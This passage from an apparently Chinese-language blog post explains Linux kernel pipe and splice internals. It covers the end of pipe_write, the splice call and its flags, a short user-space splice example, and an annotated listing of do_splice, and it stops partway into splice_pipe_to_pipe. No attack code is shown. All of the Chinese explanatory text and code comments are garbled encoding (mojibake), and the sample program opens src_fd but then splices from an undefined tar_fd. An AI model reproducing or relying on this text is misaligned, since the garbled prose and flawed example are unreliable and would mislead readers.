¹æ®æƒ…å†µå”¤é†’ç­‰å¾…çš„è¯»å–è€…æˆ–å†™å…¥è€…</span><br>	<span class="hljs-keyword">if</span> (was_empty) &#123;<br>		wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);<br>		kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);<br>	&#125;<br>    <span class="hljs-comment">//å¦‚æœå†™å…¥æˆåŠŸä¸”æˆåŠŸè·å–äº†æ–‡ä»¶ç³»ç»Ÿå†™é”ï¼Œåˆ™æ›´æ–°æ–‡ä»¶çš„è®¿é—®æ—¶é—´</span><br>	<span class="hljs-keyword">if</span> (wake_next_writer)<br>		wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);<br>	<span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span> &amp;&amp; sb_start_write_trylock(file_inode(filp)-&gt;i_sb)) &#123;<br>		<span class="hljs-type">int</span> err = file_update_time(filp);<br>		<span class="hljs-keyword">if</span> (err)<br>			ret = err;<br>		sb_end_write(file_inode(filp)-&gt;i_sb);<br>	&#125;<br>    <span class="hljs-comment">//è¿”å›å†™å…¥çš„æ€»å­—èŠ‚æ•° ret</span><br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="ä½•ä¸ºsplice"><a href="#ä½•ä¸ºsplice" class="headerlink" title="ä½•ä¸ºsplice"></a>ä½•ä¸ºsplice</h2><p>ä¸€èˆ¬æ¥è¯´ï¼Œæƒ³è¦æŠŠä¸€ä¸ªæ–‡ä»¶çš„æ•°æ®æ‹·è´åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œå¸¸è§„æ€è·¯ä¾¿æ˜¯æ‰“å¼€æ–‡ä»¶1ï¼Œå¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´ï¼Œå†™å…¥æ–‡ä»¶2</p>
<p>ä½†è¿™æ ·ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´ä¹‹é—´è¦è¿›è¡Œå¤šæ¬¡ç”¨æˆ·æ‹·è´ï¼Œå­˜åœ¨å®¢è§‚çš„å¼€é”€</p>
<p>æ‰€ä»¥è¿™æ—¶å€™ä¾¿è¦æåˆ°<strong>splice</strong>è¿™ä¸ªç”¨äºåœ¨ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¹‹é—´ç§»åŠ¨æ•°æ®çš„ç³»ç»Ÿè°ƒç”¨å•¦</p>
<p><code>splice</code> å‡½æ•°æ˜¯åœ¨ Unix&#x2F;Linux ç³»ç»Ÿä¸­ç”¨äºåœ¨ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¹‹é—´ç§»åŠ¨æ•°æ®çš„ç³»ç»Ÿè°ƒç”¨ä¹‹ä¸€ã€‚å®ƒé€šå¸¸ç”¨äºä¼˜åŒ–æ•°æ®ä¼ è¾“ï¼Œç‰¹åˆ«æ˜¯åœ¨æ–‡ä»¶å’Œç®¡é“ä¹‹é—´è¿›è¡Œé›¶æ‹·è´ä¼ è¾“ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">splice</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_in, <span class="hljs-type">loff_t</span> *off_in, <span class="hljs-type">int</span> fd_out, <span class="hljs-type">loff_t</span> *off_out, <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span>;<br><br>å‚æ•°è¯´æ˜<br>fd_inï¼šè¾“å…¥æ–‡ä»¶æè¿°ç¬¦ï¼Œæ•°æ®å°†ä»è¿™é‡Œè¯»å–ã€‚<br>off_inï¼šè¾“å…¥æ–‡ä»¶çš„åç§»é‡æŒ‡é’ˆï¼Œå¦‚æœä¸º <span class="hljs-literal">NULL</span>ï¼Œåˆ™ä½¿ç”¨å½“å‰æ–‡ä»¶åç§»é‡ã€‚<br>fd_outï¼šè¾“å‡ºæ–‡ä»¶æè¿°ç¬¦ï¼Œæ•°æ®å°†å†™å…¥åˆ°è¿™é‡Œã€‚<br>off_outï¼šè¾“å‡ºæ–‡ä»¶çš„åç§»é‡æŒ‡é’ˆï¼Œå¦‚æœä¸º <span class="hljs-literal">NULL</span>ï¼Œåˆ™ä½¿ç”¨å½“å‰æ–‡ä»¶åç§»é‡ã€‚<br>lenï¼šè¦ç§»åŠ¨çš„æ•°æ®çš„é•¿åº¦ã€‚<br>flagsï¼šæ ‡å¿—å‚æ•°ï¼Œå¯ä»¥æ˜¯ä»¥ä¸‹ä¹‹ä¸€æˆ–å®ƒä»¬çš„ç»„åˆï¼š<br>SPLICE_F_MOVEï¼šé»˜è®¤è¡Œä¸ºï¼Œè¡¨ç¤ºå°†æ•°æ®ä»è¾“å…¥æ–‡ä»¶æè¿°ç¬¦ç§»åŠ¨åˆ°è¾“å‡ºæ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™æ„å‘³ç€æ•°æ®åœ¨ç§»åŠ¨åä¸å†å­˜åœ¨äºè¾“å…¥æ–‡ä»¶æè¿°ç¬¦ä¸Šã€‚<br>SPLICE_F_NONBLOCKï¼šéé˜»å¡æ¨¡å¼ï¼Œå¦‚æœè®¾ç½®äº†æ­¤æ ‡å¿—ï¼Œå‡½æ•°å°†ä»¥éé˜»å¡æ¨¡å¼è¿è¡Œã€‚<br>SPLICE_F_MOREï¼šæç¤ºå†…æ ¸ç­‰å¾…æ›´å¤šæ•°æ®ï¼Œå¦‚æœè®¾ç½®äº†æ­¤æ ‡å¿—ï¼Œåˆ™å‘Šè¯‰å†…æ ¸è¿˜æœ‰æ›´å¤šæ•°æ®éœ€è¦ç§»åŠ¨ã€‚è¿™å¯èƒ½ä¼šå¢åŠ æ€§èƒ½ã€‚<br>SPLICE_F_GIFTï¼šè¡¨ç¤ºå°†æ•°æ®æ‰€æœ‰æƒç§»åŠ¨åˆ°è¾“å‡ºæ–‡ä»¶æè¿°ç¬¦ï¼Œè€Œä¸æ˜¯ä»…ç§»åŠ¨æ•°æ®æœ¬èº«ã€‚<br></code></pre></td></tr></table></figure>

<p>PSï¼šå°†<code>fd_in</code>ä¼ é€’åˆ°æ–‡ä»¶æè¿°ç¬¦<code>fd_out</code>ï¼Œå…¶ä¸­æ–‡ä»¶æè¿°ç¬¦ä¹‹ä¸€å¿…é¡»å¼•ç”¨ç®¡é“ï¼Œå¯¹äº<code>fd_in</code>æ¥è¯´ï¼Œè‹¥å…¶æ˜¯ä¸€ä¸ªç®¡é“æ–‡ä»¶æè¿°ç¬¦ï¼Œåˆ™<code>off_in</code>å¿…é¡»è¢«è®¾ç½®ä¸º<strong>NULL</strong>ï¼Œè‹¥å®ƒä¸æ˜¯ä¸€ä¸ªç®¡é“æè¿°ç¬¦ï¼Œåˆ™<code>off_in</code>è¡¨ç¤ºä»è¾“å…¥æ•°æ®æµçš„ä½•å¤„å¼€å§‹è¯»å…¥æ•°æ®ï¼Œæ­¤æ—¶ï¼Œå…¶è¢«è®¾ç½®ä¸º<strong>NULL</strong>ï¼Œåˆ™è¯´æ˜ä»è¾“å…¥æ•°æ®çš„å½“å‰åç§»ä½ç½®è¯»å…¥ã€‚å¦åˆ™<code>off_in</code>æŒ‡å‡ºå…·ä½“çš„åç§»ä½ç½®ã€‚ä»¥ä¸Šå¯¹äº<code>fd_out</code>å’Œ<code>off_out</code>åŒæ ·é€‚ç”¨ï¼Œåªä¸è¿‡å…¶ç”¨äºè¾“å‡ºæ•°æ®æµã€‚</p>
<h3 id="splice-pipe"><a href="#splice-pipe" class="headerlink" title="splice &amp; pipe"></a>splice &amp; pipe</h3><p>é’ˆå¯¹ä¸Šè¿°æƒ…å†µï¼Œæˆ‘ä»¬åªè®¸åˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œç„¶åé€šè¿‡ä¸¤æ¬¡<code>splice</code>ä¾¿èƒ½å®Œæˆä¸¤ä¸ªæ–‡ä»¶é—´çš„æ•°æ®æ‹·è´</p>
<p>å¤§æ¦‚æ ·ä¾‹å¦‚ä¸‹æ‰€ç¤º</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">......<br>pipe(pipe_fd);<br>src_fd = open(<span class="hljs-string">&quot;source_file&quot;</span>, O_RDWR);<br>splice(tar_fd, <span class="hljs-literal">NULL</span>, pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100</span>, SPLICE_F_MOVE);<br><br>dest_fd = open(<span class="hljs-string">&quot;dest_file&quot;</span>, O_RDWR);<br>splice(pipe_fd[<span class="hljs-number">0</span>], <span class="hljs-literal">NULL</span>, dest_fd, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100</span>, SPLICE_F_MOVE);<br>......<br></code></pre></td></tr></table></figure>

<p>æ— éœ€è¿›è¡Œå†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´çš„æ‹·è´ï¼Œç›´æ¥åœ¨å†…æ ¸å®Œæˆä¸€æ¡é¾™æœåŠ¡</p>
<h3 id="do-splice"><a href="#do-splice" class="headerlink" title="do_splice"></a>do_splice</h3><p>æ ¹æ®ç®¡é“-&gt;ç®¡é“ã€æ–‡ä»¶-&gt;ç®¡é“ã€æ–‡ä»¶-&gt;ç®¡é“ï¼Œåˆ†ä¸ºä¸‰ä¸ªåˆ†æ”¯</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Determine where to splice to/from.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">do_splice</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *in, <span class="hljs-type">loff_t</span> __user *off_in,</span><br><span class="hljs-params">		<span class="hljs-keyword">struct</span> file *out, <span class="hljs-type">loff_t</span> __user *off_out,</span><br><span class="hljs-params">		<span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">ipipe</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">opipe</span>;</span><br>	<span class="hljs-type">loff_t</span> offset;<br>	<span class="hljs-type">long</span> ret;<br>	<br>    <span class="hljs-comment">//é€šè¿‡æ£€æŸ¥è¾“å…¥å’Œè¾“å‡ºæ–‡ä»¶æè¿°ç¬¦çš„æ¨¡å¼ï¼ˆmodeï¼‰æ¥ç¡®ä¿å®ƒä»¬æ˜¯å¯è¯»å’Œå¯å†™çš„æ–‡ä»¶æè¿°ç¬¦ã€‚å¦‚æœå…¶ä¸­ä¸€ä¸ªä¸ç¬¦åˆè¦æ±‚ï¼Œåˆ™è¿”å›é”™è¯¯ç -EBADFï¼Œè¡¨ç¤ºæ— æ•ˆçš„æ–‡ä»¶æè¿°ç¬¦ã€‚</span><br>	<span class="hljs-keyword">if</span> (unlikely(!(in-&gt;f_mode &amp; FMODE_READ) ||<br>		     !(out-&gt;f_mode &amp; FMODE_WRITE)))<br>		<span class="hljs-keyword">return</span> -EBADF;<br>    <br>	<span class="hljs-comment">//ä½¿ç”¨get_pipe_info()å‡½æ•°è·å–è¾“å…¥å’Œè¾“å‡ºæ–‡ä»¶æè¿°ç¬¦å¯¹åº”çš„ç®¡é“ä¿¡æ¯</span><br>	ipipe = get_pipe_info(in, <span class="hljs-literal">true</span>);<br>	opipe = get_pipe_info(out, <span class="hljs-literal">true</span>);<br>    <br>	<span class="hljs-comment">//å¦‚æœä¸¤è€…éƒ½æ˜¯ç®¡é“ï¼Œåˆ™è¿›è¡Œç®¡é“åˆ°ç®¡é“çš„spliceæ“ä½œ</span><br>	<span class="hljs-keyword">if</span> (ipipe &amp;&amp; opipe) &#123;<br>        <span class="hljs-comment">//å°è¯•åœ¨ç®¡é“ä¸Šæ‰§è¡Œå…·æœ‰æŒ‡å®šåç§»é‡çš„æ“ä½œï¼Œè¿™åœ¨ç®¡é“æ“ä½œä¸­æ˜¯ä¸è¢«å…è®¸çš„</span><br>		<span class="hljs-keyword">if</span> (off_in || off_out)<br>			<span class="hljs-keyword">return</span> -ESPIPE;<br><br>		<span class="hljs-comment">/* Splicing to self would be fun, but... */</span><br>        <span class="hljs-comment">//æ£€æŸ¥è¾“å…¥ç®¡é“å’Œè¾“å‡ºç®¡é“æ˜¯å¦ç›¸åŒã€‚å¦‚æœå®ƒä»¬ç›¸åŒï¼Œè¡¨ç¤ºå°è¯•å°†æ•°æ®ä»ç®¡é“æ‹·è´åˆ°è‡ªèº«ï¼Œè¿™æ˜¯æ²¡æœ‰æ„ä¹‰çš„æ“ä½œ</span><br>		<span class="hljs-keyword">if</span> (ipipe == opipe)<br>			<span class="hljs-keyword">return</span> -EINVAL;<br>		<br>         <span class="hljs-comment">//æ£€æŸ¥è¾“å…¥æ–‡ä»¶å’Œè¾“å‡ºæ–‡ä»¶çš„æ ‡å¿—ï¼Œå¦‚æœå…¶ä¸­ä»»ä½•ä¸€ä¸ªè®¾ç½®äº†O_NONBLOCKæ ‡å¿—ï¼Œåˆ™å°†SPLICE_F_NONBLOCKæ ‡å¿—æ·»åŠ åˆ°flagsä¸­</span><br>		<span class="hljs-keyword">if</span> ((in-&gt;f_flags | out-&gt;f_flags) &amp; O_NONBLOCK)<br>			flags |= SPLICE_F_NONBLOCK;<br><br>		<span class="hljs-keyword">return</span> splice_pipe_to_pipe(ipipe, opipe, len, flags);<br>	&#125;<br><br>    <span class="hljs-comment">//å¦‚æœåªæœ‰è¾“å…¥æ–‡ä»¶æè¿°ç¬¦æ˜¯ç®¡é“ï¼Œåˆ™æ‰§è¡Œä»ç®¡é“åˆ°æ–‡ä»¶çš„spliceæ“ä½œ</span><br>	<span class="hljs-keyword">if</span> (ipipe) &#123;<br>        <span class="hljs-comment">//åœ¨ä»ç®¡é“ä¸­è¯»å–æ•°æ®æ—¶ï¼Œä¸å…è®¸æŒ‡å®šåç§»é‡</span><br>		<span class="hljs-keyword">if</span> (off_in)<br>			<span class="hljs-keyword">return</span> -ESPIPE;<br>		<span class="hljs-keyword">if</span> (off_out) &#123;<br>			<span class="hljs-keyword">if</span> (!(out-&gt;f_mode &amp; FMODE_PWRITE))<span class="hljs-comment">//å…ˆæ£€æŸ¥è¾“å‡ºæ–‡ä»¶æ˜¯å¦æ”¯æŒå†™å…¥æ“ä½œï¼ˆå³æ˜¯å¦æ”¯æŒPWRITEæ¨¡å¼ï¼‰</span><br>				<span class="hljs-keyword">return</span> -EINVAL;<br>			<span class="hljs-keyword">if</span> (copy_from_user(&amp;offset, off_out, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">loff_t</span>)))<span class="hljs-comment">//ä»ç”¨æˆ·ç©ºé—´æ‹·è´è¾“å‡ºåç§»é‡åˆ°å†…æ ¸ç©ºé—´çš„offsetå˜é‡ä¸­</span><br>				<span class="hljs-keyword">return</span> -EFAULT;<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			offset = out-&gt;f_pos;<span class="hljs-comment">//æ²¡æœ‰æŒ‡å®šè¾“å‡ºåç§»é‡ï¼Œåˆ™å°†è¾“å‡ºåç§»é‡è®¾ç½®ä¸ºè¾“å‡ºæ–‡ä»¶å½“å‰çš„ä½ç½®</span><br>		&#125;<br>		<br>        <span class="hljs-comment">//æ£€æŸ¥æ˜¯å¦è®¾ç½®äº†O_APPENDæ ‡å¿—ï¼Œå¦‚æœè®¾ç½®äº†ï¼Œè¡¨ç¤ºåœ¨è¾“å‡ºæ–‡ä»¶æœ«å°¾è¿½åŠ æ•°æ®ï¼Œè¿™æ˜¯ä¸å…è®¸çš„</span><br>		<span class="hljs-keyword">if</span> (unlikely(out-&gt;f_flags &amp; O_APPEND))<br>			<span class="hljs-keyword">return</span> -EINVAL;<br>		<br>        <span class="hljs-comment">//éªŒè¯å†™å…¥æ“ä½œçš„æœ‰æ•ˆæ€§ï¼ŒåŒ…æ‹¬æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å¯å†™ä»¥åŠå†™å…¥ä½ç½®æ˜¯å¦æœ‰æ•ˆã€‚</span><br>		ret = rw_verify_area(WRITE, out, &amp;offset, len);<br>		<span class="hljs-keyword">if</span> (unlikely(ret &lt; <span class="hljs-number">0</span>))<br>			<span class="hljs-keyword">return</span> ret;<br>		<span class="hljs-comment">//ç„¶åæ£€æŸ¥è¾“å…¥æ–‡ä»¶æ˜¯å¦è®¾ç½®äº†O_NONBLOCKæ ‡å¿—ï¼Œå¦‚æœè®¾ç½®äº†ï¼Œåˆ™å°†SPLICE_F_NONBLOCKæ ‡å¿—æ·»åŠ åˆ°flagsä¸­ï¼Œè¡¨ç¤ºæ‰§è¡Œéé˜»å¡çš„spliceæ“ä½œ</span><br>		<span class="hljs-keyword">if</span> (in-&gt;f_flags &amp; O_NONBLOCK)<br>			flags |= SPLICE_F_NONBLOCK;<br>        <br>		<span class="hljs-comment">//è°ƒç”¨file_start_write()å‡½æ•°é€šçŸ¥æ–‡ä»¶ç³»ç»Ÿå¼€å§‹å†™å…¥æ“ä½œ</span><br>		file_start_write(out);<br>		ret = do_splice_from(ipipe, out, &amp;offset, len, flags);<span class="hljs-comment">//ç”±do_splice_from()å‡½æ•°å®Œæˆä»ç®¡é“åˆ°æ–‡ä»¶çš„æ•°æ®ä¼ è¾“</span><br>		file_end_write(out);<span class="hljs-comment">//è°ƒç”¨file_end_write()å‡½æ•°é€šçŸ¥æ–‡ä»¶ç³»ç»Ÿå†™å…¥æ“ä½œå·²ç»å®Œæˆã€‚</span><br>		<br>        <span class="hljs-comment">//å¦‚æœæ²¡æœ‰æŒ‡å®šè¾“å‡ºåç§»é‡ï¼Œåˆ™æ›´æ–°è¾“å‡ºæ–‡ä»¶çš„ä½ç½®ä¸ºå†™å…¥æ•°æ®åçš„ä½ç½®ã€‚</span><br>		<span class="hljs-keyword">if</span> (!off_out)<br>			out-&gt;f_pos = offset;<br>		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (copy_to_user(off_out, &amp;offset, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">loff_t</span>)))<br>			ret = -EFAULT;<br><br>		<span class="hljs-keyword">return</span> ret;<br>	&#125;<br>	<span class="hljs-comment">//å¦‚æœåªæœ‰è¾“å‡ºæ–‡ä»¶æè¿°ç¬¦æ˜¯ç®¡é“ï¼Œåˆ™æ‰§è¡Œä»æ–‡ä»¶åˆ°ç®¡é“çš„spliceæ“ä½œ</span><br>	<span class="hljs-keyword">if</span> (opipe) &#123;<br>		<span class="hljs-keyword">if</span> (off_out)<span class="hljs-comment">//å‘ç®¡é“ä¸­å†™å…¥æ•°æ®æ—¶ï¼Œä¸å…è®¸æŒ‡å®šåç§»é‡</span><br>			<span class="hljs-keyword">return</span> -ESPIPE;<br>		<span class="hljs-keyword">if</span> (off_in) &#123;<br>			<span class="hljs-keyword">if</span> (!(in-&gt;f_mode &amp; FMODE_PREAD))<span class="hljs-comment">//å…ˆæ£€æŸ¥è¾“å…¥æ–‡ä»¶æ˜¯å¦æ”¯æŒè¯»å–æ“ä½œï¼ˆå³æ˜¯å¦æ”¯æŒPREADæ¨¡å¼ï¼‰</span><br>				<span class="hljs-keyword">return</span> -EINVAL;<br>			<span class="hljs-keyword">if</span> (copy_from_user(&amp;offset, off_in, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">loff_t</span>)))<span class="hljs-comment">//ä»ç”¨æˆ·ç©ºé—´æ‹·è´è¾“å…¥åç§»é‡åˆ°å†…æ ¸ç©ºé—´çš„offsetå˜é‡ä¸­</span><br>				<span class="hljs-keyword">return</span> -EFAULT;<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			offset = in-&gt;f_pos;<span class="hljs-comment">//æ²¡æœ‰æŒ‡å®šè¾“å…¥åç§»é‡ï¼Œåˆ™å°†è¾“å…¥åç§»é‡è®¾ç½®ä¸ºè¾“å…¥æ–‡ä»¶å½“å‰çš„ä½ç½®</span><br>		&#125;<br>        <br>		<span class="hljs-comment">//å¦‚æœè¾“å‡ºæ–‡ä»¶æè¿°ç¬¦è®¾ç½®äº†éé˜»å¡æ ‡å¿—ï¼ˆO_NONBLOCKï¼‰ï¼Œåˆ™è®¾ç½®ç›¸åº”çš„æ ‡å¿—ä½</span><br>		<span class="hljs-keyword">if</span> (out-&gt;f_flags &amp; O_NONBLOCK)<br>			flags |= SPLICE_F_NONBLOCK;<br>        <br>		<span class="hljs-comment">//è·å–ç®¡é“çš„é”ï¼Œä»¥ç¡®ä¿å¹¶å‘æƒ…å†µä¸‹ç®¡é“çš„æ“ä½œä¸ä¼šå†²çª</span><br>		pipe_lock(opipe);<br>        <br>        <span class="hljs-comment">//ç­‰å¾…ç®¡é“æœ‰è¶³å¤Ÿçš„ç©ºé—´æ¥å†™å…¥æ•°æ®</span><br>		ret = wait_for_space(opipe, flags);<br>		<span class="hljs-keyword">if</span> (!ret) &#123;<br>			<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_space;<br><br>			<span class="hljs-comment">/* Don&#x27;t try to read more the pipe has space for. */</span><br>             <span class="hljs-comment">/*</span><br><span class="hljs-comment">             opipe-&gt;max_usage è¡¨ç¤ºç®¡é“çš„æœ€å¤§ä½¿ç”¨é‡ï¼Œå³ç®¡é“çš„æ€»å®¹é‡ã€‚</span><br><span class="hljs-comment">			pipe_occupancy(opipe-&gt;head, opipe-&gt;tail) è¡¨ç¤ºå½“å‰ç®¡é“ä¸­å·²å ç”¨çš„ç©ºé—´ã€‚</span><br><span class="hljs-comment">			é€šè¿‡è®¡ç®—å¯çŸ¥ï¼Œp_space è¡¨ç¤ºç®¡é“ä¸­çš„å‰©ä½™å¯ç”¨ç©ºé—´ï¼Œå³æ€»å®¹é‡å‡å»å·²å ç”¨çš„ç©ºé—´ã€‚</span><br><span class="hljs-comment">			*/</span><br>			p_space = opipe-&gt;max_usage - pipe_occupancy(opipe-&gt;head, opipe-&gt;tail);<br>             <span class="hljs-comment">//å°†å†™å…¥æ•°æ®çš„é•¿åº¦é™åˆ¶ä¸ºå½“å‰ç®¡é“å‰©ä½™ç©ºé—´å’Œç»™å®šé•¿åº¦ len ä¸­çš„è¾ƒå°è€…ã€‚</span><br>			len = <span class="hljs-type">min_t</span>(<span class="hljs-type">size_t</span>, len, p_space &lt;&lt; PAGE_SHIFT);<br><br>			ret = do_splice_to(in, &amp;offset, opipe, len, flags);<br>		&#125;<br>        <span class="hljs-comment">//è§£é”</span><br>		pipe_unlock(opipe);<br>        <br>        <span class="hljs-comment">//å¦‚æœå†™å…¥æˆåŠŸï¼ˆè¿”å›å€¼å¤§äº0ï¼‰ï¼Œåˆ™å”¤é†’ç®¡é“ä¸Šçš„è¯»å–è€…</span><br>		<span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>			wakeup_pipe_readers(opipe);<br>        <span class="hljs-comment">//å¦‚æœæ²¡æœ‰æŒ‡å®šè¾“å…¥åç§»é‡ï¼Œåˆ™æ›´æ–°è¾“å…¥æ–‡ä»¶æè¿°ç¬¦çš„å½“å‰ä½ç½®</span><br>		<span class="hljs-keyword">if</span> (!off_in)<br>			in-&gt;f_pos = offset;<br>        <span class="hljs-comment">//å¦‚æœæŒ‡å®šäº†è¾“å…¥åç§»é‡ï¼Œåˆ™å°†æœ€ç»ˆçš„åç§»é‡ä»å†…æ ¸ç©ºé—´æ‹·è´å›ç”¨æˆ·ç©ºé—´</span><br>		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (copy_to_user(off_in, &amp;offset, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">loff_t</span>)))<br>			ret = -EFAULT;<br><br>		<span class="hljs-keyword">return</span> ret;<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h3 id="ç®¡é“-ç®¡é“"><a href="#ç®¡é“-ç®¡é“" class="headerlink" title="ç®¡é“-&gt;ç®¡é“"></a>ç®¡é“-&gt;ç®¡é“</h3><p>å¹¶ä¸æ˜¯å¾ˆé‡è¦ï¼Œå°±æ”¾ä¸€è¾¹å§ğŸ˜‹</p>
<h4 id="splice-pipe-to-pipe"><a href="#splice-pipe-to-pipe" class="headerlink" title="splice_pipe_to_pipe"></a>splice_pipe_to_pipe</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 